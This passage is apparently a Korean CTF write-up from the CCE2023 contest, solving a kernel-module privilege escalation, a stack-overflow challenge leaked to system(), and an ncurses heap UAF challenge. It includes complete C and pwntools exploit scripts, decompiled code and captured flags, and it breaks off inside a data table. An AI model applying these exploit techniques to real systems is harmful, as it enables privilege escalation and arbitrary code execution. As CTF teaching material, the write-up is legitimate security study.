key\t*cached_requested_key; #endif /* * executable name, excluding path. * * - normally initialized setup_new_exec() * - access it with [gs]et_task_comm() * - lock it with task_lock() */ char\tcomm[TASK_COMM_LEN]; 출제자분의 라이트업에서는 task_struct를 찾기 위해서 prctl PR_SET_NAME으로 이름을 바꿔주고 0x1001로 메모리를 읽으면서 그 문자열 위치를 탐색하고 문자열 위치 - 0x10 위치에 cred 구조체 포인터가 있으니까 0x1337로 참조해서 익스했다.\nExploit script #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;sys/ioctl.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;sys/wait.h\u0026gt; struct ioctl_info { uint32_t idx; uint32_t dummy; uint64_t src; uint64_t sz; uint64_t off; }__attribute__((packed)); #define CREATE 0x10003 #define MODIFY 0x10002 #define DELETE 0x10004 int main() { int fd; struct ioctl_info io; if ((fd = open(\u0026#34;/dev/K-exploit\u0026#34;, O_RDWR)) \u0026lt; 0){ puts(\u0026#34;ERR\u0026#34;); exit(1); } io.idx = 0; char * buf = malloc(0xc0); strcpy(buf, \u0026#34;DEADBEEF0\u0026#34;); io.src = (int64_t)buf; io.sz = 0xa0; // cred if ((int)ioctl(fd, CREATE, \u0026amp;io) \u0026lt; 0){ io.idx =0; ioctl(fd, DELETE, \u0026amp;io); if ((int)ioctl(fd, CREATE, \u0026amp;io) \u0026lt; 0){ puts(\u0026#34;ERR\u0026#34;); } } char * flag = malloc(0x40); int fl = 0; int pid[0x100]; for(int i =0;i\u0026lt;0x100;i++){ pid[i] = fork(); if (pid[i] == 0){ sleep(3); if (getuid() == 0){ fl = 0; puts(\u0026#34;priv escalated\u0026#34;); int f = open(\u0026#34;/flag\u0026#34;,O_RDONLY); printf(\u0026#34;%d\u0026#34;,f); read(f, flag,0x40); puts(flag); } exit(0); } else if (pid[i] == -1){ puts(\u0026#34;fork error\u0026#34;); } } memcpy(buf,\u0026#34;\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\u0026#34;,40); int v; for (int i=0;i\u0026lt; 30;i++){ io.off = (0xac480-0xc0*10)/0x8 + i; io.sz = 40; if ((int)ioctl(fd, MODIFY, \u0026amp;io) \u0026lt; 0){ puts(\u0026#34;ERR\u0026#34;); exit(1); } puts(\u0026#34;trying\u0026#34;); } int status; wait(\u0026amp;status); close(fd); if(fl == 0){ puts(\u0026#34;NOPE\u0026#34;); } return 0; } cce2023{y0u_kn0w_Linux_k3rn3l_3xploit?}\nn0t_rand0m Analysis setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); puts(\u0026#34;what your name?\u0026#34;); read(0, buf, 8uLL); printf(\u0026#34;Hello %s\u0026#34;, buf); puts(\u0026#34;write comment\u0026#34;); read(0, comment, 0x18uLL); v3 = time(0LL); srand(v3); while ( 1 ) { while ( 1 ) { nbytes_4 = rand() % 9 + 1; printf(\u0026#34;random number : %d\\n\u0026#34;, nbytes_4); printf(\u0026#34;continue? (yes or no) \u0026#34;); read(0, haystack, 8uLL); if ( strstr(haystack, \u0026#34;no\u0026#34;) ) break; if ( !strstr(haystack, \u0026#34;yes\u0026#34;) ) exit(1); } switch ( nbytes_4 ) { case 1u: printf(\u0026#34;comment : %s\\n\u0026#34;, comment); continue; case 2u: printf(\u0026#34;name : %s\\n\u0026#34;, buf); continue; case 3u: puts(\u0026#34;write new comment\u0026#34;); read(0, comment, nbytes); continue; case 4u: puts(\u0026#34;write new name\u0026#34;); read(0, buf, nbytes); continue; case 5u: nbytes = strlen(comment); printf(\u0026#34;%d\\n\u0026#34;, nbytes); continue; case 6u: nbytes = strlen(buf); printf(\u0026#34;%d\\n\u0026#34;, nbytes); continue; case 7u: sub_401296(nbytes); goto LABEL_15; case 8u: sub_401345(nbytes); goto LABEL_15; case 9u: LABEL_15: exit(1); case 0xAu: sub_4013B1(buf); break; default: continue; } } } unsigned __int64 __fastcall sub_401296(unsigned int a1) { char buf[8]; // [rsp+18h] [rbp-28h] BYREF char v3[24]; // [rsp+20h] [rbp-20h] BYREF unsigned __int64 v4; // [rsp+38h] [rbp-8h] v4 = __readfsqword(0x28u); puts(\u0026#34;one more time what your name\u0026#34;); read(0, buf, a1); printf(\u0026#34;ok %s\\n\u0026#34;, buf); puts(\u0026#34;did you have fun?\u0026#34;); read(0, v3, a1); puts(\u0026#34;ok...bye\u0026#34;); return v4 - __readfsqword(0x28u); } int __fastcall sub_4013B1(const char *a1) { return system(a1); } 일반적으로는 %9 + 1 때문에 0xa에는 접근할 수 없다.\nExploitation char buf[8]; // [rsp+8h] [rbp-28h] BYREF char comment[24]; // [rsp+10h] [rbp-20h] BYREF comment와 buf가 인접해있다.\ncase 5u: nbytes = strlen(comment); printf(\u0026#34;%d\\n\u0026#34;, nbytes); continue; case 6u: nbytes = strlen(buf); printf(\u0026#34;%d\\n\u0026#34;, nbytes); nbytes를 strlen으로 늘릴 수 있다. 인접해있기에 strlen(buf)로 늘려주면 nbytes를 늘릴 수 있다.\nsub_401296타고 들어가서 canary leak하고 ret를 system 쪽으로 뛰면 된다.\nExploit script from pwn import * from ctypes import CDLL e = ELF(\u0026#39;./n0t_rand0m\u0026#39;) libc = ELF(\u0026#34;./libc.so.6\u0026#34;) #p = process(\u0026#39;./n0t_rand0m\u0026#39;,env={\u0026#34;LD_PRELOAD\u0026#34;:\u0026#34;./libc.so.6\u0026#34;}) p = remote(\u0026#34;20.196.192.95\u0026#34;,8888) context.log_level=\u0026#39;debug\u0026#39; def func(n): while True: rvu(b\u0026#39;random number : \u0026#39;) r = int(rvl()[:-1]) if r == n: sa(b\u0026#39;continue? (yes or no)\u0026#39;,b\u0026#39;no\u0026#39;) break else: sa(b\u0026#39;continue? (yes or no)\u0026#39;,b\u0026#39;yes\u0026#39;) sa = lambda x,y : p.sendafter(x,y) rvu = lambda x : p.recvuntil(x) rvl = lambda : p.recvline() sa(b\u0026#39;what your name?\u0026#39;,b\u0026#39;A\u0026#39;*8) rvu(b\u0026#34;A\u0026#34;*8) # stack = u64(rvu(b\u0026#34;\\x7f\u0026#34;).ljust(8,b\u0026#39;\\x00\u0026#39;)) # success(hex(stack-0x2b1)) # local leak sa(b\u0026#39;write comment\u0026#39;,b\u0026#39;A\u0026#39;*0x18) func(2) func(6) func(3) sa(b\u0026#39;write new comment\u0026#39;,b\u0026#39;A\u0026#39;*0x20) func(6) func(3) sa(b\u0026#39;write new comment\u0026#39;,b\u0026#39;A\u0026#39;*0x28) func(6) func(1) rvu(b\u0026#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#39;) l =u64(rvu(b\u0026#39;\\x7f\u0026#39;).ljust(8,b\u0026#39;\\x00\u0026#39;)) #remote leak success(hex(l)) # func(4) # sa(b\u0026#39;write new name\u0026#39;,b\u0026#39;sh\\x00\u0026#39;) # func(7) # sa(b\u0026#39;one more time what your name\u0026#39;,b\u0026#39;A\u0026#39;*0x21) # rvu(b\u0026#39;A\u0026#39;*0x21) # can = b\u0026#39;\\x00\u0026#39;+p.recv(7) # sa(b\u0026#39;did you have fun?\u0026#39;,b\u0026#39;A\u0026#39;*0x18 + can +p64(stack-0x2b1+0x28)+p64(0x04016B0)) func(7) sa(b\u0026#39;one more time what your name\u0026#39;,b\u0026#39;A\u0026#39;*0x21) rvu(b\u0026#39;A\u0026#39;*0x21) can = b\u0026#39;\\x00\u0026#39;+p.recv(7) sa(b\u0026#39;did you have fun?\u0026#39;,b\u0026#39;A\u0026#39;*0x18 + can +p64(l + 0x1ae908 + 0x28)+p64(0x04016B0)) p.interactive() 로컬에선 릭이 됐는데, 리모트에선 안되길래 그냥 따로 릭을 진행했다. cce2023{c306445363ca0d34c2fd4ba6e2da5ea19052ae855d00b3b46bc71785d16db14542d944d41934e2bcdab0816a154a8872b1258334cbc2f2672004db5a}\nFit 이건 대회끝나고 보니까 솔버나왔길래 궁금해서 풀어봤다.\nAnalysis __int64 __fastcall main(int a1, char **a2, char **a3) { unsigned int v3; // eax v3 = time(0LL); srand(v3); initscr(); raw(); curs_set(1); resizeterm(25, 80); cbreak(); keypad(stdscr, 1); noecho(); go(); endwin(); echo(); return 0LL; } ncurses 냄새가 난다.\nv11 = __readfsqword(0x28u); clock_gettime(1, \u0026amp;tp); clock_gettime(1, \u0026amp;v6); memset(rand_char, 0, sizeof(rand_char)); v8 = 0; memset(input_, 0, sizeof(input_)); v10 = 0; stage_ = 1; v3 = 0; get_rand_char_20(rand_char); render_screen(1u, 0, rand_char, (const char *)input_); while ( 1 ) { do { while ( 1 ) { while ( 1 ) { v4 = wgetch(stdscr); if ( v4 == -1 ) goto LABEL_18; if ( (v4 \u0026lt;= \u0026#39;@\u0026#39; || v4 \u0026gt; \u0026#39;a\u0026#39;) \u0026amp;\u0026amp; (v4 \u0026lt;= \u0026#39;`\u0026#39; || v4 \u0026gt; \u0026#39;z\u0026#39;) \u0026amp;\u0026amp; (v4 \u0026lt;= \u0026#39;/\u0026#39; || v4 \u0026gt; \u0026#39;9\u0026#39;) ) break; if ( v3 \u0026lt;= 19 ) *((_BYTE *)input_ + v3++) = v4; } if ( v4 != 0x107 ) break; if ( v3 \u0026gt; 0 ) --v3; *((_BYTE *)input_ + v3) = 0; wclear(qword_5250); } } while ( v4 != 0x157 \u0026amp;\u0026amp; v4 != \u0026#39;\\n\u0026#39; ); // get_by_line LABEL_18: if ( v4 == 343 || v4 == 10 ) break; LABEL_24: get_time(\u0026amp;v6); render_screen(stage_, LODWORD(v6.tv_sec) - LODWORD(tp.tv_sec), rand_char, (const char *)input_); } if ( memcmp(input_, rand_char, 20uLL) ) // not correct -\u0026gt; go input again { LABEL_23: wclear(qword_5250); memset(input_, 0, 20uLL); v3 = 0; goto LABEL_24; } if ( ++stage_ != 6 ) { get_rand_char_20(rand_char); goto LABEL_23; } clock_gettime(1, \u0026amp;v6); *game_struct = v6.tv_sec - tp.tv_sec; // time if ( v6.tv_nsec \u0026gt;= tp.tv_nsec ) { game_struct[1] = v6.tv_nsec - tp.tv_nsec; } else { --*game_struct; game_struct[1] = v6.tv_nsec + 1000000000 - tp.tv_nsec; } return v11 - __readfsqword(0x28u); } 랜덤으로 문자열 뽑아서 입력된 문자열과 비교한다.\n_BOOL8 __fastcall retry_(__int64 *game_struct) { int i; // [rsp+10h] [rbp-10h] int v3; // [rsp+14h] [rbp-Ch] _QWORD *v4; // [rsp+18h] [rbp-8h] register_game_result(game_struct); // heap leak next node pointer leak vulnerabililty wclear(stdscr); wborder( stdscr, (unsigned int)dword_5200, (unsigned int)dword_5200, (unsigned int)dword_51E4, (unsigned int)dword_51E4, 0LL, 0LL, 0LL, 0LL); wmove(stdscr, 2, 38); printw(\u0026#34;Record\u0026#34;); v4 = (_QWORD *)start_res_block[5]; for ( i = 0; i \u0026lt;= 4; ++i ) { wmove(stdscr, 3 * i + 5, 7); printw(\u0026#34;%d.\u0026#34;, (unsigned int)(i + 1)); if ( v4 ) // block + 0x28 -\u0026gt; 0 { wmove(stdscr, 3 * i + 5, 11); printw(\u0026#34;%s\u0026#34;, (const char *)v4 + 0x10); // heap leak vuln trigger wmove(stdscr, 3 * i + 5, 52); printw(\u0026#34;%ld.%ld\u0026#34;, *v4, v4[1]); v4 = (_QWORD *)v4[5]; // AAR ? next pointer can be overflowed } } wmove(stdscr, 20, 34); echo(); printw(\u0026#34;Retry(y/N)?\u0026#34;); v3 = wgetch(stdscr); noecho(); return v3 != \u0026#39;y\u0026#39;; } 한판 끝나고 결과 저장해주고, 더 할건지 묻는다.\n0LL); wmove(stdscr, 5, 37); printw(\u0026#34;Result\u0026#34;); wmove(stdscr, 9, 30); printw(\u0026#34;Passed Time: %ld.%ld\u0026#34;, *game_struct, game_struct[1]); wmove(stdscr, 13, 20); printw(\u0026#34;Name: \u0026#34;); wrefresh(stdscr); echo(); game_res_struct_malloc = (__int64 *)malloc(0x30uLL); *game_res_struct_malloc = *game_struct; game_res_struct_malloc[1] = game_struct[1]; game_res_struct_malloc[5] = 0LL; read(0, game_res_struct_malloc + 2, 0x20uLL); noecho(); if ( current_res_block ) current_res_block[5] = (__int64)game_res_struct_malloc; else start_res_block[5] = game_res_struct_malloc; result = (unsigned __int64)game_res_struct_malloc; current_res_block = game_res_struct_malloc; } return result; } 이름을 기록한다. singly linked list로 저장한다.\nwmove(stdscr, 13, 20); printw(\u0026#34;Name index: \u0026#34;); wrefresh(stdscr); echo(); scanw(\u0026#34;%d\u0026#34;, \u0026amp;idx); wclear(stdscr); wborder( stdscr, (unsigned int)dword_5200, (unsigned int)dword_5200, (unsigned int)dword_51E4, (unsigned int)dword_51E4, 0LL, 0LL, 0LL, 0LL); noecho(); wmove(stdscr, 13, 20); printw(\u0026#34;Name: \u0026#34;);\twrefresh(stdscr); echo(); v3 = read(0, NAME, 0x14uLL); NAME[v3 - 1] = 0; noecho(); for ( i = 0; i \u0026lt; idx; ++i ) { if ( !v4 ) return v7 - __readfsqword(0x28u); v5 = v4; v4 = (__int64 *)v4[5]; // next ptr } if ( v4 ) // if exists { memcpy(v4 + 2, NAME, 0x14uLL); // name rewriting? AAW trigger? puts((const char *)v5 + 0x10); // print_name? } return v7 - __readfsqword(0x28u); } 게임 끝나고 \u0026lsquo;y\u0026rsquo;가 아니라면 실행되는 함수다. idx 받고 이름 다시 써준다.\nExploitation 취약점은 대놓고 주는데, 익스가 오래걸렸다. I/O가 이상해서 pyte 터미널 에뮬레이터를 활용했다.\ngame_res_struct_malloc = (__int64 *)malloc(0x30uLL); *game_res_struct_malloc = *game_struct; game_res_struct_malloc[1] = game_struct[1]; game_res_struct_malloc[5] = 0LL; read(0, game_res_struct_malloc + 2, 0x20uLL); 경계 체크가 미흡해서 다음 노드를 가리키는 포인터를 덮을 수 있다.\necho(); game_res_struct_malloc = (__int64 *)malloc(0x30uLL); *game_res_struct_malloc = *game_struct; 초기화가 하지 않아서 UAF를 트리거할 수 있다.\nwmove(stdscr, 2, 38); printw(\u0026#34;Record\u0026#34;); v4 = (_QWORD *)start_res_block[5]; for ( i = 0; i \u0026lt;= 4; ++i ) { wmove(stdscr, 3 * i + 5, 7); printw(\u0026#34;%d.\u0026#34;, (unsigned int)(i + 1)); if ( v4 ) // block + 0x28 -\u0026gt; 0 { wmove(stdscr, 3 * i + 5, 11); printw(\u0026#34;%s\u0026#34;, (const char *)v4 + 0x10); // heap leak vuln trigger wmove(stdscr, 3 * i + 5, 52); printw(\u0026#34;%ld.%ld\u0026#34;, *v4, v4[1]); v4 = (_QWORD *)v4[5]; // AAR ? next pointer can be overflowed } } wmove(stdscr, 20, 34); 출력해줘서 여기서 릭하면 된다.\n__int64 printw(__int64 a1, ...) { __va_list_tag va[1]; // [rsp+0h] [rbp-D8h] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-C0h] va_start(va, a1); v3 = __readfsqword(0x28u); return vw_printw((__int64)stdscr, a1, (__int64)va); } __int64 __fastcall vw_printw(__int16 *a1, __int64 a2, __int64 a3) { __int64 v4; // rax unsigned __int8 *v5; // rax v4 = _nc_screen_of(a1); v5 = (unsigned __int8 *)sub_189A0(v4, a2, a3); if ( v5 ) return waddnstr(a1, v5, -1); else return 0xFFFFFFFFLL; } goto LABEL_54; return v23; } v51 = string; v6 = v5 + (_DWORD)string + 1; while ( 1 ) { ++v51; v7 = _nc_screen_of(a1); v8 = (unsigned __int8 *)unctrl_sp(v7, v3); if ( !v8[1] || (v9 = __ctype_b_loc(), ((*v9)[v3] \u0026amp; 0x4002) == 0x4000) ) { v25 = *((_DWORD *)a1 + 4); v26 = a1[1]; v27 = *((_DWORD *)a1 + 5); v28 = a1[1]; v29 = BYTE1(v25); char *__fastcall unctrl_sp(__int64 a1, unsigned __int8 a2) { int v2; // eax int v3; // eax __int64 v5; // rax const unsigned __int16 **v6; // r8 if ( a1 ) { v2 = *(_DWORD *)(a1 + 1496); if ( v2 \u0026gt; 1 ) { v3 = a2 - 128; if ( (unsigned int)v3 \u0026lt;= 0x1F || (unsigned int)a2 - 160 \u0026lt;= 0x5F ) return (char *)\u0026amp;unk_293A0 + word_297C0[v3]; goto LABEL_7; } if ( (unsigned int)a2 - 160 \u0026lt;= 0x5F ) { if ( v2 != 1 ) { if ( v2 ) goto LABEL_7; v6 = __ctype_b_loc(); v5 = a2; if ( ((*v6)[a2] \u0026amp; 0x4000) == 0 ) return (char *)\u0026amp;unk_293A0 + *((__int16 *)\u0026amp;off_291A0 + v5); } v3 = a2 - 128; return (char *)\u0026amp;unk_293A0 + word_297C0[v3]; } } LABEL_7: v5 = a2; return (char *)\u0026amp;unk_293A0 + *((__int16 *)\u0026amp;off_291A0 + v5); } 특정 범위에 안걸리면 릭이 제대로 되서 간단하게 제대로 된 주소 나올때까지 반복적으로 시도하면 바로 익스할 수 있었지만, printw의 출력 로직을 분석해서 한번에 익스플로잇되도록 만들었다. 겹치는 부분이 생겨서 가짓수가 꽤 나오기 때문에 백트레킹해서 주소가 제대로 나왔는지 확인했다.\n이후 AAW로 잘 덮고, 마저 익스했다.\nExploit script from pwn import * import pyte DEBUG = True context.terminal=[\u0026#39;tmux\u0026#39;, \u0026#39;splitw\u0026#39;, \u0026#39;-h\u0026#39;] context.binary = e = ELF(\u0026#39;./fit\u0026#39;) libc = ELF(\u0026#39;/usr/lib/x86_64-linux-gnu/libc.so.6\u0026#39;) off = [0x2000, 0x25D0] # 0x2000, 0x0002346 script = \u0026#39;\u0026#39; for i in off: script += f\u0026#39;brva {hex(i)}\\n\u0026#39; if DEBUG: p = gdb.debug(e.path, gdbscript=script) else : p = process(e.path) dims = (80, 25) screen = pyte.Screen(*dims) stream = pyte.ByteStream(screen) sl = lambda x : p.sendline(x) s = lambda x : p.send(x) def feed_stream() -\u0026gt; str: global stream,screen stream.feed(p.recv(2000)) scr = \u0026#39;\u0026#39; for i in screen.display: scr += str(i) + \u0026#39;\\n\u0026#39; return scr def rvuntil(b : bytes) -\u0026gt; bytes: for i in range(20): rv = p.recv(2000,timeout=1) sleep(0.01) if b in rv: break return rv def solve(st) -\u0026gt; int: scr = feed_stream().split() try: ans = (scr[scr.index(\u0026#39;Word:\u0026#39;)+2]) stage = int(scr[scr.index(\u0026#39;Stage\u0026#39;)+1]) sl(ans) if stage != st: return solve(st) except: return solve(st) return stage ctype_loc = [0x0002, 0x0002,0x0002,0x0002,0x0002,0x0002,0x0002,0x0002,0x0002,0x2003, 0x2002,0x2002, 0x2002, 0x2002,0x0002, 0x0002, 0x0002, 0x0002,0x0002,0x0002, 0x0002,0x0002,0x0002,0x0002,0x0002, 0x0002, 0x0002, 0x0002,0x0002,0x0002,0x0002,0x0002,0x6001, 0xc004, 0xc004, 0xc004, 0xc004, 0xc004, 0xc004, 0xc004, 0xc004, 0xc004, 0xc004, 0xc004, 0xc004, 0xc004, 0xc004, 0xc004, 0xd808, 0xd808, 0xd808, 0xd808, 0xd808, 0xd808, 0xd808, 0xd808, 0xd808, 0xd808, 0xc004, 0xc004, 0xc004, 0xc004, 0xc004, 0xc004, 0xc004, 0xd508, 0xd508, 0xd508, 0xd508, 0xd508, 0xd508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc004, 0xc004,0xc004, 0xc004, 0xc004, 0xc004, 0xd608, 0xd608, 0xd608, 0xd608, 0xd608, 0xd608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc004, 0xc004, 0xc004, 0xc004, 0x0002,0x0000, 0x0000,0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000,0x0000, 0x0000,0x0000,0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000,0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0020, 0x0000,0x0000,0x0000,0x0000,0x0000,0x0028,0x0000,0x0043,0x0000, 0x0029,0x0000, 0x0000, 0x0000,0x0000, 0x0000, 0x003c, 0x0000,0x003c,0x0000, 0x0000,0x0000,0x0000,0x0000, 0x002d, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000,0x0028,0x0000,0x0052, 0x0000, 0x0029, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0075, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x002c, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x003e, 0x0000, 0x003e, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0020, 0x0000, 0x0031, 0x0000, 0x002f, 0x0000, 0x0034, 0x0000, 0x0020, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0020, 0x0000, 0x0031, 0x0000, 0x002f, 0x0000, 0x0032, 0x0000, 0x0020, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0020, 0x0000, 0x0033, 0x0000, 0x002f, 0x0000, 0x0034, 0x0000, 0x0020, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0041, 0x0000, 0x0045, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0078, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0073, 0x0000, 0x0073, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0061, 0x0000, 0x0065, 0x0000, ] def unctrl_sp_emu(x): global ctype_loc word_29780 = [0, 3, 2, 3, 4, 3, 6, 3, 8, 3, 10, 3, 12, 3, 14, 3, 16, 3, 18, 3, 20, 3, 22, 3, 24, 3, 26, 3, 28, 3, 30, 3, 32, 3, 34, 3, 36, 3, 38, 3, 40, 3, 42, 3, 44, 3, 46, 3, 48, 3, 50, 3, 52, 3, 54, 3, 56, 3, 58, 3, 60, 3, 62, 3, 64, 3, 66, 3, 68, 3, 70, 3, 72, 3, 74, 3, 76, 3, 78, 3, 80, 3, 82, 3, 84, 3, 86, 3, 88, 3, 90, 3, 92, 3, 94, 3, 96, 3, 98, 3, 100, 3, 102, 3, 104, 3, 106, 3, 108, 3, 110, 3, 112, 3, 114, 3, 116, 3, 118, 3, 120, 3, 122, 3, 124, 3, 126, 3, 128, 3, 130, 3, 132, 3, 134, 3, 136, 3, 138, 3, 140, 3, 142, 3, 144, 3, 146, 3, 148, 3, 150, 3, 152, 3, 154, 3, 156, 3, 158, 3, 160, 3, 162, 3, 164, 3, 166, 3, 168, 3, 170, 3, 172, 3, 174, 3, 176, 3, 178, 3, 180, 3, 182, 3, 184, 3, 186, 3, 188, 3, 190, 3, 192, 3, 194, 3, 196, 3, 198, 3, 200, 3, 202, 3, 204, 3, 206, 3, 208, 3, 210, 3, 212, 3, 214, 3, 216, 3, 218, 3, 220, 3, 222, 3, 224, 3, 226, 3, 228, 3, 230, 3, 232, 3, 234, 3, 236, 3, 238, 3, 240, 3, 242, 3, 244, 3, 246, 3, 248, 3, 250, 3, 252, 3, 254, 3] unk_29360 = [94, 64, 0, 94, 65, 0, 94, 66, 0, 94, 67, 0, 94, 68, 0, 94, 69, 0, 94, 70, 0, 94, 71, 0, 94, 72, 0, 94, 73, 0, 94, 74, 0, 94, 75, 0, 94, 76, 0, 94, 77, 0, 94, 78, 0, 94, 79, 0, 94, 80, 0, 94, 81, 0, 94, 82, 0, 94, 83, 0, 94, 84, 0, 94, 85, 0, 94, 86, 0, 94, 87, 0, 94, 88, 0, 94, 89, 0, 94, 90, 0, 94, 91, 0, 94, 92, 0, 94, 93, 0, 94, 94, 0, 94, 95, 0, 32, 0, 33, 0, 34, 0, 35, 0, 36, 0, 37, 0, 38, 0, 39, 0, 40, 0, 41, 0, 42, 0, 43, 0, 44, 0, 45, 0, 46, 0, 47, 0, 48, 0, 49, 0, 50, 0, 51, 0, 52, 0, 53, 0, 54, 0, 55, 0, 56, 0, 57, 0, 58, 0, 59, 0, 60, 0, 61, 0, 62, 0, 63, 0, 64, 0, 65, 0, 66, 0, 67, 0, 68, 0, 69, 0, 70, 0, 71, 0, 72, 0, 73, 0, 74, 0, 75, 0, 76, 0, 77, 0, 78, 0, 79, 0, 80, 0, 81, 0, 82, 0, 83, 0, 84, 0, 85, 0, 86, 0, 87, 0, 88, 0, 89, 0, 90, 0, 91, 0, 92, 0, 93, 0, 94, 0, 95, 0, 96, 0, 97, 0, 98, 0, 99, 0, 100, 0, 101, 0, 102, 0, 103, 0, 104, 0, 105, 0, 106, 0, 107, 0, 108, 0, 109, 0, 110, 0, 111, 0, 112, 0, 113, 0, 114, 0, 115, 0, 116, 0, 117, 0, 118, 0, 119, 0, 120, 0, 121, 0, 122, 0, 123, 0, 124, 0, 125, 0, 126, 0, 94, 63, 0, 126, 64, 0, 126, 65, 0, 126, 66, 0, 126, 67, 0, 126, 68, 0, 126, 69, 0, 126, 70, 0, 126, 71, 0, 126, 72, 0, 126, 73, 0, 126, 74, 0, 126, 75, 0, 126, 76, 0, 126, 77, 0, 126, 78, 0, 126, 79, 0, 126, 80, 0, 126, 81, 0, 126, 82, 0, 126, 83, 0, 126, 84, 0, 126, 85, 0, 126, 86, 0, 126, 87, 0, 126, 88, 0, 126, 89, 0, 126, 90, 0, 126, 91, 0, 126, 92, 0, 126, 93, 0, 126, 94, 0, 126, 95, 0, 77, 45, 32, 0, 77, 45, 33, 0, 77, 45, 34, 0, 77, 45, 35, 0, 77, 45, 36, 0, 77, 45, 37, 0, 77, 45, 38, 0, 77, 45, 39, 0, 77, 45, 40, 0, 77, 45, 41, 0, 77, 45, 42, 0, 77, 45, 43, 0, 77, 45, 44, 0, 77, 45, 45, 0, 77, 45, 46, 0, 77, 45, 47, 0, 77, 45, 48, 0, 77, 45, 49, 0, 77, 45, 50, 0, 77, 45, 51, 0, 77, 45, 52, 0, 77, 45, 53, 0, 77, 45, 54, 0, 77, 45, 55, 0, 77, 45, 56, 0, 77, 45, 57, 0, 77, 45, 58, 0, 77, 45, 59, 0, 77, 45, 60, 0, 77, 45, 61, 0, 77, 45, 62, 0, 77, 45, 63, 0, 77, 45, 64, 0, 77, 45, 65, 0, 77, 45, 66, 0, 77, 45, 67, 0, 77, 45, 68, 0, 77, 45, 69, 0, 77, 45, 70, 0, 77, 45, 71, 0, 77, 45, 72, 0, 77, 45, 73, 0, 77, 45, 74, 0, 77, 45, 75, 0, 77, 45, 76, 0, 77, 45, 77, 0, 77, 45, 78, 0, 77, 45, 79, 0, 77, 45, 80, 0, 77, 45, 81, 0, 77, 45, 82, 0, 77, 45, 83, 0, 77, 45, 84, 0, 77, 45, 85, 0, 77, 45, 86, 0, 77, 45, 87, 0, 77, 45, 88, 0, 77, 45, 89, 0, 77, 45, 90, 0, 77, 45, 91, 0, 77, 45, 92, 0, 77, 45, 93, 0, 77, 45, 94, 0, 77, 45, 95, 0, 77, 45, 96, 0, 77, 45, 97, 0, 77, 45, 98, 0, 77, 45, 99, 0, 77, 45, 100, 0, 77, 45, 101, 0, 77, 45, 102, 0, 77, 45, 103, 0, 77, 45, 104, 0, 77, 45, 105, 0, 77, 45, 106, 0, 77, 45, 107, 0, 77, 45, 108, 0, 77, 45, 109, 0, 77, 45, 110, 0, 77, 45, 111, 0, 77, 45, 112, 0, 77, 45, 113, 0, 77, 45, 114, 0, 77, 45, 115, 0, 77, 45, 116, 0, 77, 45, 117, 0, 77, 45, 118, 0, 77, 45, 119, 0, 77, 45, 120, 0, 77, 45, 121, 0, 77, 45, 122, 0, 77, 45, 123, 0, 77, 45, 124, 0, 77, 45, 125, 0, 77, 45, 126, 0, 126, 63, 0, 128, 0, 129, 0, 130, 0, 131, 0, 132, 0, 133, 0, 134, 0, 135, 0, 136, 0, 137, 0, 138, 0, 139, 0, 140, 0, 141, 0, 142, 0, 143, 0, 144, 0, 145, 0, 146, 0, 147, 0, 148, 0, 149, 0, 150, 0, 151, 0, 152, 0, 153, 0, 154, 0, 155, 0, 156, 0, 157, 0, 158, 0, 159, 